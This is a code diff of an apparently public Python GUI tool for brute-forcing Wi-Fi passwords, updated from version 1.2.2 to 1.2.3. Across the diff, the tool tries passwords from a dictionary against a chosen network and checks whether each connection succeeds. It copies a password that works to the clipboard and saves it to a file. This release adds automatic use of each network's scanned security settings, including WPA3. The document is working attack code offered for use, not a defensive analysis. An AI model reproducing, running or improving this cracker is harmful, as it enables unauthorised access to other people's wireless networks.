@@ -2,13 +2,12 @@
 """
 Author: 白恒aead
 Repositories: https://github.com/baihengaead/wifi-crack-tool
-Version: 1.2.2
+Version: 1.2.3
 """
 import os,sys,datetime,time,threading,ctypes,json
 import platform
 
-import pywifi
-from pywifi import const
+from pywifi import const,PyWiFi,_wifiutil_win,Profile
 from pywifi.iface import Interface
 
 import pyperclip
@@ -30,7 +29,7 @@ class MainWindow(QMainWindow):
         else:
             self.icon_path = "images/wificrack.ico"
         
-        if pywifi.PyWiFi().interfaces().__len__() <= 1 and  mutex is None:
+        if PyWiFi().interfaces().__len__() <= 1 and  mutex is None:
             self.showinfo(title=self.windowTitle(), message='应用程序的另一个实例已经在运行。')
             sys.exit()
         
@@ -41,8 +40,8 @@ class MainWindow(QMainWindow):
         #------------------------- 初始化控件状态 -------------------------------#
         self.ui.cbo_wifi_name.addItem('——全部——')
         
-        self.ui.cbo_security_type.addItems(['WPA','WPAPSK','WPA2','WPA2PSK','UNKNOWN'])
-        self.ui.cbo_security_type.setCurrentIndex(3)
+        self.ui.cbo_security_type.addItems(['——自动——','WPA','WPAPSK','WPA2','WPA2PSK','WPA3','WPA3SAE','OPEN'])
+        self.ui.cbo_security_type.setCurrentIndex(0)
         self.set_display_using_pwd_file()
         
         self.ui.cbo_wifi_name.setDisabled(True)
@@ -372,11 +371,13 @@ class WifiCrackTool:
             self.tool:WifiCrackTool = tool
             self.win = tool.win
             self.ui = tool.ui
-            self.wifi = pywifi.PyWiFi()
+            self.wifi = PyWiFi()
             self.wnics = self.wifi.interfaces()
             self.iface:Interface
             self.get_wnic()
             self.ssids = []
+            self.profile_dict = {}
+            '''wifi信息字典'''
             self.convert_success = False
             self.is_auto = False
 
@@ -426,10 +427,17 @@ class WifiCrackTool:
                 ap_list = list(ap_dic_tmp.values())
                 
                 self.win.show_msg.send("扫描完成！\n","black")
-                self.ssids = []
+                self.ssids:list[str] = []
+                self.profile_dict:dict[str,Profile] = {}
                 for i,data in enumerate(ap_list):#输出扫描到的WiFi名称
-                    ssid = data.ssid#self.coding_convert(data.ssid,'utf-8')
+                    ssid = data.ssid
                     self.ssids.insert(i,ssid)
+                    profile = Profile()
+                    profile.ssid = data.ssid # * wifi名称
+                    profile.auth = data.auth # * 网卡的开放
+                    profile.akm = data.akm # * wifi加密算法，一般是 WPA2PSK
+                    profile.cipher = data.cipher # * 加密单元
+                    self.profile_dict[data.ssid] = profile
                 self.win.reset_controls_state.send()
                 self.win.add_wifi_items.send(self.ssids)
                 if len(self.ssids) > 0:
@@ -545,44 +553,45 @@ class WifiCrackTool:
             :count 已尝试连接的次数
             '''
             try:
-                self.iface.disconnect()  # 断开所有连接
-                # 判断安全加密类型
+                self.iface.disconnect()  # * 断开所有连接
+                # * 判断安全加密类型
                 akm = self.ui.cbo_security_type.currentText()
+                akm_i = self.ui.cbo_security_type.currentIndex()
                 akm_v = 4
-                if akm=='WPA':
-                    akm_v = 1
-                elif akm=='WPAPSK':
-                    akm_v = 2
-                elif akm=='WPA2':
-                    akm_v = 3
-                elif akm=='WPA2PSK':
-                    akm_v = 4
-                elif akm=='UNKNOWN':
-                    akm_v = 5
-                profile = pywifi.Profile()  #创建wifi配置对象
-                profile.ssid = ssid#.encode('utf-8').decode('gb18030') #Wifi SSID 解码为gb18030
-                profile.key = pwd   # type: ignore #WiFi密码
-                profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
-                profile.akm.append(akm_v)  #wifi加密算法，一般是 WPA2PSK
-                profile.cipher = const.CIPHER_TYPE_CCMP #加密单元
-                self.iface.remove_network_profile(profile)  #删除wifi文件
-                tem_profile = self.iface.add_network_profile(profile)   #添加新的WiFi文件
+                akm_dict = _wifiutil_win.akm_str_to_value_dict
+                if akm in akm_dict:
+                    akm_v = akm_dict[akm]
+                else:
+                    akm_v = const.AKM_TYPE_NONE
+                
+                profile = Profile()  # * 创建wifi配置对象
+                if akm_i == 0:
+                    profile = self.profile_dict[ssid]
+                else:
+                    profile.ssid = ssid # * wifi名称
+                    profile.auth = const.AUTH_ALG_OPEN  # * 网卡的开放
+                    profile.akm = akm_v  # * wifi加密算法，一般是 WPA2PSK
+                    profile.cipher = const.CIPHER_TYPE_CCMP # * 加密单元
+                    
+                profile.key = pwd   # * type: ignore #WiFi密码
+                self.iface.remove_network_profile(profile)  # * 删除wifi文件
+                tem_profile = self.iface.add_network_profile(profile)   # * 添加新的WiFi文件
                 self.win.show_msg.send(f"正在进行第{count}次尝试...\n","black")
-                self.iface.connect(tem_profile) #连接
-                time.sleep(self.tool.config_settings_data['connect_time'])   #连接需要时间
-                if self.iface.status() == const.IFACE_CONNECTED:    #判断是否连接成功
+                self.iface.connect(tem_profile) # * 连接
+                time.sleep(self.tool.config_settings_data['connect_time'])   # * 连接需要时间
+                if self.iface.status() == const.IFACE_CONNECTED:    # * 判断是否连接成功
                     self.win.show_msg.send(f"连接成功，密码：{pwd}\n\n","green")
                     self.tool.reset_controls_state()
-                    pyperclip.copy(pwd); #将密码复制到剪切板
+                    pyperclip.copy(pwd); # * 将密码复制到剪切板
                     if filetype != 'json':
                         self.tool.pwd_dict_data.append({'ssid':ssid,'pwd':pwd})
-                        # 直接将数据写入文件
+                        # * 直接将数据写入文件
                         with open(self.tool.pwd_dict_path, 'w',encoding='utf-8') as json_file:
                             json.dump(self.tool.pwd_dict_data, json_file, indent=4)
                     return True
                 else:
                     self.win.show_msg.send(f"连接失败，密码是{pwd}\n\n","red")
-                    self.iface.remove_network_profile(profile)  #删除wifi文件
+                    self.iface.remove_network_profile(profile)  # * 删除wifi文件
                     return False
 
             except Exception as r:
@@ -614,7 +623,7 @@ if __name__ == "__main__":
             #==================================================#
             
             __mutex = None
-            if pywifi.PyWiFi().interfaces().__len__() <= 1:
+            if PyWiFi().interfaces().__len__() <= 1:
                 __mutex = acquire_mutex()
             
             window = MainWindow(__mutex)
@@ -639,7 +648,7 @@ if __name__ == "__main__":
             #==================================================#
                         
             __lock = None
-            if pywifi.PyWiFi().interfaces().__len__() <= 1:
+            if PyWiFi().interfaces().__len__() <= 1:
                 __lock = acquire_lock()
                 
             window = MainWindow(__lock)
